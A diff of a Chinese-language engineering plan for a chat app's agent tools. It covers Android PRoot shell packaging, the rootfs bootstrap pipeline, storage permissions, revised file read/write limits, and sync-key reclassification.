 4. **PRoot binary 打包（jniLibs）**：`android/app/src/main/jniLibs/arm64-v8a/libproot_exec.so`（必要時含 loader `.so`）；**禁用 Flutter assets**——API 29+ 壓縮 assets 無 exec 權限。執行策略**二選一後固定**：①`android:extractNativeLibs="true"`（安裝時解壓至 nativeLibraryDirectory，該路徑可執行）；②uncompressed＋page-aligned 直接自 APK 執行（需確認 16 KB alignment 與 exec bit 行為）。啟動 probe：解析實際 binary path、驗證可執行、記錄 hash 與版本 metadata；binary 必須為 bionic/linker 相容 build（**不可**假設一般 linux-aarch64 binary 可跑）；真機驗證 `proot --version`、`echo`、`ls`、`cat`、`/bin/sh`；probe 失敗 → Shell disable（`broken`）。release APK 目前 ARM64-only——新增 ABI 必須同時提供對應 binary 或明確限縮 ABI filter；若未來啟用 32-bit ABI，PRoot argv 需附加 **`--kernel-release`**（fallback `Os.uname().release`）以避開 vendor vDSO 偽核心擋路（kelivo #1231 已驗證；arm64-only 現況不適用，僅作 ABI 鉤子備註）。
 5. **Rootfs bootstrap——五階段 pipeline**：Alpine rootfs 有明確版本/ABI/hash/來源 URL；**pinned、可追蹤來源＋hash 驗證——不接受 LLM 任意指定 rootfs URL**（若開放手動 URL：僅限使用者明確操作＋HTTPS＋大小受限＋hash 驗證，模型不可改變 runtime source）；rootfs 打包於 APK 或首次啟動下載**擇一後固定**；tar.gz/tar.xz 由 pinned metadata 或副檔名判斷。**五階段**：`download`（connect/read timeout、大小上限、progress、取消）→ `stage`（解壓前先取 **lock**——防兩個 generation 併發初始化；staging 解壓＋path traversal 檢查）→ `validate`（`/bin/sh`、必要 symlink、executable mode、ABI/version/hash）→ `activate`（**atomic rename** 替換 active rootfs；失敗保留舊版或回 disabled/broken）→ `cleanup`（刪 archive、staging、rootfs `/tmp`、`/var/tmp`、app temp files）。partial extraction 下次啟動可安全清理重解；rootfs／apk cache／staging／user-installed packages 皆設 **disk quota**（可查看、可清理）；bootstrap progress 本地化字串、不阻塞 UI。
 6. **Rootfs patcher（可重複、可測試）**：寫入可用 DNS resolver；`/etc/hosts`、localhost 與 hostname 合法；`LANG=C.UTF-8`；建立 `/tmp`、`/var/tmp`、`/root` 並設定權限；必要時 host supplementary group 對應（避免 bind mount 存取出現難解的權限錯誤）；**僅修改 rootfs staging/active 內允許的檔案，不可觸碰 host workspace**。
@@ -331,7 +336,7 @@
 8. **Host path probe**（提供 Android Shell definitions **之前**）：①path 是 directory ②app 可列出目錄 ③可建立並刪除 random probe file ④非 `content://` URI ⑤canonical path 與 workspace 設定一致；probe 失敗回傳清楚的 permission/path error——不延後至 PRoot command 執行時才暴露。
 9. **Storage permission 策略**（F-Droid-only 前提）：Manifest 保留 `MANAGE_EXTERNAL_STORAGE`；僅在使用者選擇外部 workspace 時導向 Special app access（系統設定）；從設定頁返回後 recheck；denied 時保留 app-private workspace 與 disabled 選項、**不得把 permission denied 靜默轉成外部 workspace 成功**；`requestLegacyExternalStorage` 不作 Android 11+ 權限策略依據；`content://` SAF path 明確拒絕、不傳入 PRoot。
 10. **套件安裝契約**：使用者或 LLM 可透過 `shell_exec` 執行 `apk add` 等安裝命令，但**不承諾所有套件可用**——受前景 timeout 限制；大型 Python package、native compilation、重型資料分析套件可能失敗或超時；package cache 與 rootfs quota 可查看清理；network/DNS/Alpine mirror/OEM 差異真機驗證；不提供 background install 或稍後自動完成的承諾。
-11. **資源限制（Android 列）**：預設 timeout 30s／hard 120s；stdout cap 24 KB／stderr 6 KB（序列化總長 ≤32,768 字元——§2.2 同源預算）；同時前景執行 1 個；app restart recovery 不適用。**app 進背景／鎖屏不承諾 command 完成**——前景服務（P2-2）即便維持 generation，PRoot child 實際存活仍需真機確認；這不等於支援 background jobs。
+11. **資源限制（Android 列）**：預設 timeout 30s／hard 120s；stdout cap 24 KB／stderr 6 KB（序列化總長 ≤68KB——§2.2 同源預算）；同時前景執行 1 個；app restart recovery 不適用。**app 進背景／鎖屏不承諾 command 完成**——前景服務（P2-2）即便維持 generation，PRoot child 實際存活仍需真機確認；這不等於支援 background jobs。
 12. **non-sandbox prompt 契約**：system prompt 明文 `Commands start in the selected workspace. This is not a security sandbox.` 並說明已設定的 PRoot bindings；Android prompt 說明 command 的 current directory 是 `/workspace`（shell 工具使用 guest path）與 external workspace noexec 限制；**不要求模型使用 host absolute path**（host path 只留在 app 內部 execution context）；不得宣稱 workspace 邊界可限制 shell commands。
 13. **實作檔案（v4 §十一 Android 子集；命名建議對齊 P1-6 的 `lib/core/services/shell/`）**：`shell/android_proot_backend.dart`、`shell/proot_bootstrap.dart`、`shell/rootfs_patcher.dart`、`shell/workspace_mount_table.dart`、`shell/workspace_path_probe.dart`＋對應測試（backend/bootstrap/patcher/mount_table/probe）；`android/app/src/main/jniLibs/arm64-v8a/libproot_exec.so`；`android/app/build.gradle.kts`（packaging/ABI filter）與 `AndroidManifest.xml`（`extractNativeLibs`、storage permission）核對；F-Droid license/source/metadata 檔。
 14. **完成條件（Android 部分，原 v4 §十六相關條目）**：Android 只提供 `shell_exec`；至少一台 arm64 真機以 jniLibs `.so` 啟動 PRoot 執行 `echo`/`ls`/`cat`；app-private workspace **免 `MANAGE_EXTERNAL_STORAGE` 即可執行**；external workspace 僅在 permission＋probe 雙成功時啟用，且 noexec 限制已對模型與使用者說明；PRoot、File Tools、path resolver、prompt 與 cleanup 共用同一 mount table；同一 generation 兩個工具家族使用同一 physical workspace path；`cwd` 限於 `/workspace` 對應範圍；rootfs pipeline（含 patch、atomic activate、broken recovery）測試通過；restore 後 rootfs 依版本/hash 重建（見整合註記）；license/文件完整。
@@ -366,9 +371,9 @@
 
 ---
 
-### 2.10 P2-7 kelivo 資料模型對齊（**可選**）⬜
+### 2.10 P2-7 kelivo 資料模型對齊（**可選**）⏸️【暫不做】
 
-`message.parts` 遷移 + sealed StreamChunk 事件模型 + trace 錄製回放測試——**僅在需要持續吸收上游 decoder 修補時才做**，否則維持 `tool_events_v1` 投影。藍圖：kelivo `a43b79f` + `docs/ai-stream.md`。不阻塞任何項目。
+**裁示（2026-11-11）**：暫不做。現行維持 `tool_events_v1` 投影即可，暫不進行 `message.parts` 遷移、sealed StreamChunk 事件模型與 trace 錄製回放測試。未來僅在需要持續吸收上游 decoder 修補時再行評估。藍圖：kelivo `a43b79f` + `docs/ai-stream.md`。不阻塞任何項目。
 
 ---
 
@@ -407,26 +412,16 @@
 
 ---
 
-### 2.13 P3-4 上限再校準 + 磁碟預算 ✅【2026-11-08 完成】
+### 2.13 P3-4 上限再校準 + 磁碟預算 ✅【2026-11-08 完成；2026-11-11 改版】
 
-**目標**：讓開發者模式**名實相符**——現行上限是為「一般使用者的沙盒」設計的（實測常數：`maxWriteBytes = 512KB`、`maxReadBytes = 24KB`、單次工具回傳 32,768 字元），真實 coding 場景（資料檔、設計資產、大型 JSON fixtures）會不斷撞牆。
+**現行規格（2026-11-11）**：
+1. **寫入無產品上限**：`file_write`／`file_append` 不再有 512 KB／2 MB；`file_edit`／`file_patch` 因整檔讀入記憶體，保留 `maxEditableFileBytes = 64 MB` 技術 guard（非產品上限）。
+2. **讀取**：`file_read` 預設 64 KB、上限 256 KB；`offset`／`limit`／`next_offset`／`has_more` 契約不變；`ToolResultCaps` 的 `file_read` 預算 260 KB，persistence cap 同步 260 KB（確保重啟／重放後仍完整）。
+3. **磁碟預算顯示**：`WorkspaceDiskUsageService.measure()` 非同步掃描工作區（不跟隨連結、排除根目錄 `.omnichat/`、上限 50,000 項目並回報 `truncated`）；`WorkspaceDiskUsageCard` 顯示總量／檔案數／partial 狀態與重新整理，掛在 `WorkspaceToolsPage` 頂部。
+4. **移除**：dev mode 倍率、2 MB 提示、`test/file_tool_developer_limits_test.dart`；改由 `test/file_tool_write_limit_test.dart` 覆蓋 3 MB 寫入與 4 MB append。
+5. **測試**：3 MB 寫入、4 MB append、`file_read` 64/256 KB、`ToolResultCaps` per-tool、`workspace_disk_usage_test.dart`（總量／`.omnichat/` 排除／截斷／格式化）。
 
-**實作內容**：
-1. **開發者模式下寫入上限 512KB → 2MB 級**（`FileToolService` 常數改為 dev-mode 條件式；**預設沙盒的 512KB hard floor 不變**——保護一般使用者，ADR-A8 教義「hard floor 不隨審批放寬」同源）。
-2. **磁碟預算顯示**：工作區佔用可視化（Workspace Tools 頁/設定）——放寬上限後的配套責任（零殘留政策的誠信配套）。
-3. **`file_read` 分頁體驗優化**：24KB 窗口 + offset/limit 的翻頁效率（檔案變大後成為模型讀大檔的實際瓶頸）。
-
-**落地紀錄（2026-11-08）**：
-- `FileToolService.execute(..., developerMode: ...)` 由 `ToolHandlerService` 注入 `SettingsProvider.developerModeV1`；預設仍為 `maxWriteBytes = 512KB`，dev mode 使用 `developerMaxWriteBytes = 2MB`。`file_write`／`file_append`／`file_edit`／`file_patch`／`file_create_pdf` 與其錯誤訊息同步採用實際上限；審批不會改變上限（ADR-A8）。
-- `WorkspaceDiskUsageService.measure()` 非同步掃描工作區（不跟隨連結、排除根目錄 `.omnichat/`、上限 50,000 項目並回報 `truncated`）；`WorkspaceDiskUsageCard` 顯示總量／檔案數／partial 狀態與重新整理，掛在 `WorkspaceToolsPage` 頂部；桌面 popover 與行動 sheet 將目前 workspace path 傳入 Tools 頁。dev mode 開啟時 Tools 頁另顯示 2MB 提示。
-- `file_read` 預設窗口由 16KB 提高為 24KB（等於既有上限），維持單次結果低於 32,768 字元；`offset`／`limit`／`next_offset`／`has_more` 契約不變。
-- l10n ×4 新增 disk usage 與 dev-mode 寫入上限提示。
-- 測試：`test/file_tool_developer_limits_test.dart`（預設 512KB、dev 600KB 成功、2MB 上限、append 邊界）、`test/workspace_disk_usage_test.dart`（總量／`.omnichat/` 排除／截斷／格式化）；既有 `file_read` 邊界測試維持通過。
-- 後續修正（2026-11-08）：partial 訊息改用 `scannedEntryCount`（實際掃描 entry 數，不再借用 `fileCount`）；`formatWorkspaceBytes` 修正 1023.95KB 顯示 1024KB 的進位邊界；新增 `ToolHandlerService` developer-mode 接線、24KB 預設窗口與磁碟卡 widget 測試。
-
-**依賴 P1-6**——本質是 dev mode 的參數校正，P1-6 落地後才有意義。
-
-**測試**：dev mode 開/關的上限行為（關閉時回 512KB）、磁碟預算計算（含 `.omnichat/` 排除）、分頁邊界。
+**依賴 Workspace Tools 頁**——兩個權限開關與磁碟用量卡都在同一頁。
 
 ---
 
@@ -508,7 +503,7 @@ P1-1 落地時 `file_edit` 已有**預覽 diff**（`buildEditPreviewDiff`：確�
 | **壓縮 × prompt cache 互咬** | marker 凍結切點 + 成批壓縮 + 注入位置穩定；P2-6(L3) 檔案地圖以 mtime 為失效鍵，未變則逐字相同；cache_expiry 已落地（2026-11-06），僅在最後成功 usage 閒置 ≥30 分鐘時觸發 |
 | **兩把 token 尺**（預算 `chars/3` vs 閾值 usage 實測） | 觸發一律以 usage 實測為準；chars 估算僅作內部預算 |
 | **Windows 穩定性**（P1-6/P2-5）：pipe deadlock、孤兒子程序樹、cp950 亂碼 | shell 串行、collectors-first drain、Job Object tree-kill、環境 allowlist、secret 遮蔽；手冊 §5.1「外部程序治理」子節隨落地補上 |
-| **同步分類（§5.7）** | `developer_mode_v1`、shell allowlist、審批政策 = 全域偏好（同步）；`agent_runs_v1` = 裝置本地（**與附B 矛盾處隨 P2-1 裁定**，見 §2.4） |
+| **同步分類（§5.7）** | `file_outside_workspace_allow_all_v1`、`shell_allow_all_v1` = 全域偏好（同步）；舊 `developer_mode_v1`／`shell_allowlist_v1`／`approval_*` 載入時清除；`agent_runs_v1` = 裝置本地（**與附B 矛盾處隨 P2-1 裁定**，見 §2.4） |
 | **Dart `async*`**：`yield*` 於 try/catch 的例外穿透限制 | kernel/driver/新服務一律 `await for` + `yield`（§3.10 守則） |
 | **voice/AI Team 路徑** | 主線不動 + 回歸測試（`chat_turn_service_test`、AI Team smoke）；P2-3 子代理沿用串行先例 |
 | **舊路徑雙軌期**（P0-3） | kill-switch + 一個 soak 版本後移除；雙軌期內不對舊迴圈加任何新功能 |
@@ -537,7 +532,7 @@ flutter test                    # 新增測試 + 既有回歸（700+ 案全綠�
 | §4 ADR 表 | ADR-A7（checkpoint 翻案）、ADR-A8/A9（shell 政策）已在計畫 §2 定義，隨落地核對 | P1-6 / P2-1 |
 | §5.1 Windows 穩定性 | 新增子節「外部程序治理」（`Process.start` + collectors 先於 wait、超 cap 持續 drain、Job Object tree-kill、環境 allowlist、cp950/`chcp 65001`、secret 遮蔽） | P1-6 |
 | §3.1 工作區沙盒檔案系統 | 措辭更新：「預設沙盒；沙盒外寫入需逐次明示核准；黑名單與容量上限不隨核准放寬」；新增唯讀 session-outputs zone（`file_read`/`file_search` 可進、寫入拒）＋ retention（20 檔/7 天） | P1-6 |
-| §5.7 `_localOnlyKeys` | 新鍵值歸類審查（`developer_mode_v1`/allowlist 同步；`agent_runs_v1` 本地） | P1-6 / P2-1 |
+| §5.7 `_localOnlyKeys` | 新鍵值歸類審查（`file_outside_workspace_allow_all_v1`／`shell_allow_all_v1` 同步；`agent_runs_v1` 本地；舊 developer/allowlist/approval keys 清除） | P1-6 / P2-1 |
 | §3.14 Agent Runtime | checkpoint、背景任務、子代理各小節隨落地補記 | P2-1 起 |
 | §7 現狀與待辦 | 各項完成後更新 roadmap（並標記本計畫為 Cowork 剩餘項目的權威清單） | 每版本 |
 | §3.1 檔案工具 | `file_edit` 匹配策略（三段降級、ambiguous 策略標示）隨落地補記 | P1-8 |
